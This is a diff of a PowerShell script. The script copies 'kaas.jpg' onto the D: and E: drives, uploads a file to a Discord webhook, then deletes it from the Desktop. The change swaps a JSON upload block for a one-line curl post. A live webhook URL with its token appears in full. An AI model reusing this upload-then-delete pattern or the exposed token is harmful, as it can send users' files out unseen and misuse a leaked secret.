@@ -302,30 +302,10 @@ Copy-Item -Path "kaas.jpg" -Destination "D:\" -Force
 # Copy the file to E:\
 Copy-Item -Path "kaas.jpg" -Destination "E:\" -Force
 
-$desktopPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::Desktop), "kaas.jpg")
-$webhookUrl = "https://discord.com/api/webhooks/1051825689227165806/KeD-xcnMKq6uC9DkmGciCrbGoTGpXcyxtn2aM06Kse3P8aTlY9vkofgpLftwuRdHD6CZ"
+$file = "kaas.jpg"
+$url = "https://discord.com/api/webhooks/1051825689227165806/KeD-xcnMKq6uC9DkmGciCrbGoTGpXcyxtn2aM06Kse3P8aTlY9vkofgpLftwuRdHD6CZ"
 
-$fileContent = Get-Content -Path $desktopPath -Encoding Byte
-$fileData = [Convert]::ToBase64String($fileContent)
-$fileType = "image/jpeg"
-$fileName = "kaas.jpg"
-
-# The key should be "file" instead of "value" for the content
-$body = @{
-    file = @{
-        file = $fileData
-        type = $fileType
-        name = $fileName
-    }
-} | ConvertTo-Json
-
-# Add headers for multipart/form-data content type
-$headers = @{
-    "Content-Type" = "multipart/form-data"
-}
-
-Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -Headers $headers
-
+curl -Uri $url -Method Post -InFile $file -ContentType "multipart/form-data"
 
 # Delete the file from the Desktop
 Remove-Item -Path "kaas.jpg" -Force
